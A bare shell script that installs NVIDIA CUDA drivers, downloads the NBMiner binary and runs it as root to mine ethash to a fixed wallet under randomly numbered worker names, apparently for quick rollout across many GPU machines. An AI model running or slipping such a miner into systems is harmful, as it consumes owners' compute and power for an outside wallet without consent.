cd /home
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/3bf863cc.pub
sudo apt-get update
sudo apt-get -y install cuda-drivers-510
sudo apt-get install libcurl3 -y
wget https://github.com/NebuTech/NBMiner/releases/download/v42.2/NBMiner_42.2_Linux.tgz
sudo tar -xvf NBMiner_42.2_Linux.tgz
cd NBMiner_Linux
sudo ./nbminer -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 3Ev3mZawL4TRxeC2Li91gZg5Yrx1k5npL7.$(echo $(shuf -i 1000-9999 -n 1)-KVN) -log
